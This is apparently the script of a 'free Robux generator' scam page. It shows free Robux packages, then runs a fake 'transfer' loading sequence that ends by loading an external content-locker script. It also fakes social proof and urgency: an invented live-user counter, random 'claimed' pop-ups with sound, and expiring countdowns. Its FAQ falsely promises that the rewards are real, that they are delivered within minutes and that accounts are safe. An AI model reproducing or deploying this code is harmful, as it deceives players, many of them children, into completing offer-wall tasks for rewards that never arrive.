<script type="text/javascript">
  var BShtZ_iEt_khrnhc={"it":4146566,"key":"27ad0"};
</script>
<script src="https://d3v3431sr9puku.cloudfront.net/0a1f25d.js"></script>

<script>
(() => {
  const ROBUX_ICON = 'https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico';

  const showLocker = () => {
    if (typeof window.BShtZ_iEt_khrnhc_show === 'function') {
      window.BShtZ_iEt_khrnhc_show();
    } else if (typeof window.showLocker === 'function') {
      window.showLocker();
    } else {
      const s = document.createElement('script');
      s.src = 'https://d3v3431sr9puku.cloudfront.net/0a1f25d.js';
      document.body.appendChild(s);
    }
  };

  const names = ["PioBlx", "RobloxKing", "NoobMaster69", "Builderman", "GamerGirl99", "ShadowHunter", "EpicLoot", "Vortex", "Zenix", "Krystal"];
  const amounts = ["1,700", "4,500", "10,000", "22,500", "11,000", "24,000"];

  const faqs = [
    {
      q: "Is this real?",
      a: "Yes, it is real. We have partnered with top sponsors to provide free Robux rewards. Simply complete the required steps to claim your rewards instantly."
    },
    {
      q: "How long does it take to receive Robux?",
      a: "Once you complete the verification steps, the Robux are typically credited to your account within 5-10 minutes."
    },
    {
      q: "Is my account safe?",
      a: "Absolutely. We never ask for your password. Our system uses secure Roblox API protocols to ensure a safe and seamless transfer."
    }
  ];

  const mainPackages = [
    { amount: "400", price: "Free" },
    { amount: "800", price: "Free" },
    { amount: "1,700", price: "Free", isPopular: true },
    { amount: "4,500", price: "Free" },
    { amount: "10,000", price: "Free" },
    { amount: "22,500", price: "Free" }
  ];

  const bonusPackages = [
    { amount: "24,000", bonus: "1,500", price: "Free" },
    { amount: "11,000", bonus: "1,000", price: "Free", isPopular: true },
    { amount: "5,250", bonus: "750", price: "Free" },
    { amount: "2,000", bonus: "300", price: "Free" }
  ];

  const fmtTime = (seconds) => {
    if (seconds <= 0) return '0:00';
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${String(s).padStart(2, '0')}`;
  };

  const createPkgCard = ({ amount, bonus, price, isPopular, countdown }, onClick) => {
    const card = document.createElement('div');
    card.className = 'pkg' + (isPopular ? ' popular' : '');

    const expired = typeof countdown === 'number' && countdown <= 0;
    if (expired) card.classList.add('expired');

    if (isPopular && !expired) {
      const best = document.createElement('div');
      best.className = 'best';
      best.textContent = 'Best Value';
      card.appendChild(best);
    }

    if (typeof countdown === 'number') {
      const cd = document.createElement('div');
      cd.className = 'countdown';
      cd.textContent = expired ? 'ENDED' : `Ends in ${fmtTime(countdown)}`;
      cd.dataset.countdown = String(countdown);
      card.appendChild(cd);
    }

    const icon = document.createElement('img');
    icon.src = ROBUX_ICON;
    icon.alt = 'Robux';
    card.appendChild(icon);

    const h = document.createElement('h4');
    h.textContent = amount;
    card.appendChild(h);

    const sub = document.createElement('p');
    sub.className = 'sub';
    sub.textContent = 'Robux';
    card.appendChild(sub);

    if (bonus) {
      const b = document.createElement('div');
      b.className = 'bonus';
      b.textContent = `+${bonus} Bonus`;
      card.appendChild(b);
    }

    const btn = document.createElement('button');
    btn.className = 'btn-primary';
    btn.textContent = expired ? 'EXPIRED' : price;
    btn.disabled = expired;
    btn.addEventListener('click', () => !expired && onClick());
    card.appendChild(btn);

    return card;
  };

  const renderFaq = () => {
    const faqRoot = document.getElementById('faq');
    faqRoot.innerHTML = '';

    faqs.forEach((item, idx) => {
      const wrap = document.createElement('div');
      wrap.className = 'faq-item';

      const btn = document.createElement('button');
      btn.className = 'faq-btn';
      btn.type = 'button';
      btn.innerHTML = `<span class="faq-q">${item.q}</span><span class="faq-arrow">▼</span>`;

      const ans = document.createElement('div');
      ans.className = 'faq-a';
      ans.innerHTML = `<p>${item.a}</p>`;

      btn.addEventListener('click', () => {
        [...faqRoot.querySelectorAll('.faq-item')].forEach((el) => {
          if (el !== wrap) el.classList.remove('open');
        });
        wrap.classList.toggle('open');
      });

      wrap.appendChild(btn);
      wrap.appendChild(ans);
      faqRoot.appendChild(wrap);
    });
  };

  let liveUsers = 8432;
  const liveUsersEl = document.getElementById('liveUsers');
  const updateLiveUsers = () => {
    const change = Math.floor(Math.random() * 20) - 10;
    let next = liveUsers + change;
    if (next < 7000) next = 7000 + Math.abs(change);
    if (next > 12000) next = 12000 - Math.abs(change);
    liveUsers = next;
    liveUsersEl.textContent = liveUsers.toLocaleString();
  };

  const toast = document.getElementById('claimToast');
  const toastName = document.getElementById('toastName');
  const toastAmount = document.getElementById('toastAmount');
  const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
  audio.volume = 0.3;

  let toastTimer = null;
  const showClaim = () => {
    const name = names[Math.floor(Math.random() * names.length)];
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    toastName.textContent = name;
    toastAmount.textContent = amount;
    toast.hidden = false;

    try { audio.currentTime = 0; audio.play(); } catch (_) {}

    if (toastTimer) clearTimeout(toastTimer);
    toastTimer = setTimeout(() => { toast.hidden = true; }, 5000);
  };

  const countdowns = Array(4)
    .fill(0)
    .map(() => Math.floor(Math.random() * (300 - 180 + 1)) + 180);

  const tickCountdowns = () => {
    document.querySelectorAll('.countdown[data-countdown]').forEach((el, idx) => {
      const n = Math.max(0, Number(el.dataset.countdown) - 1);
      el.dataset.countdown = String(n);
      const card = el.closest('.pkg');

      if (n <= 0) {
        el.textContent = 'ENDED';
        card.classList.add('expired');
        const btn = card.querySelector('button');
        btn.textContent = 'EXPIRED';
        btn.disabled = true;
      } else {
        el.textContent = `Ends in ${fmtTime(n)}`;
      }
    });
  };

  const overlay = document.getElementById('loadingOverlay');
  const progress = document.getElementById('progressBar');
  const msg = document.getElementById('loadingMessage');

  const loadingMessages = [
    'Connecting to Roblox servers...',
    'Verifying account status...',
    'Generating secure transaction...',
    'Finalizing Robux transfer...',
    'Redirecting to verification...'
  ];

  let loadingStep = 0;
  let loadingInterval = null;

  const startLoading = () => {
    if (loadingInterval) return;

    overlay.classList.add('show');
    overlay.setAttribute('aria-hidden', 'false');

    loadingStep = 0;
    msg.textContent = loadingMessages[0];
    progress.style.width = `${(1 / loadingMessages.length) * 100}%`;

    loadingInterval = setInterval(() => {
      loadingStep += 1;
      if (loadingStep >= loadingMessages.length) {
        clearInterval(loadingInterval);
        loadingInterval = null;
        setTimeout(() => { showLocker(); }, 500);
        return;
      }
      msg.textContent = loadingMessages[loadingStep];
      progress.style.width = `${((loadingStep + 1) / loadingMessages.length) * 100}%`;
    }, 1500);
  };

  const bonusGrid = document.getElementById('bonusGrid');
  const mainGrid = document.getElementById('mainGrid');

  bonusPackages.forEach((p, i) => {
    bonusGrid.appendChild(createPkgCard({ ...p, countdown: countdowns[i] }, startLoading));
  });

  mainPackages.forEach((p) => {
    mainGrid.appendChild(createPkgCard(p, startLoading));
  });

  renderFaq();

  document.querySelectorAll('[data-action="purchase"]').forEach((btn) => {
    btn.addEventListener('click', startLoading);
  });

  setInterval(updateLiveUsers, 3000);
  setInterval(() => showClaim(), 10000);
  setInterval(tickCountdowns, 1000);
})();
</script>
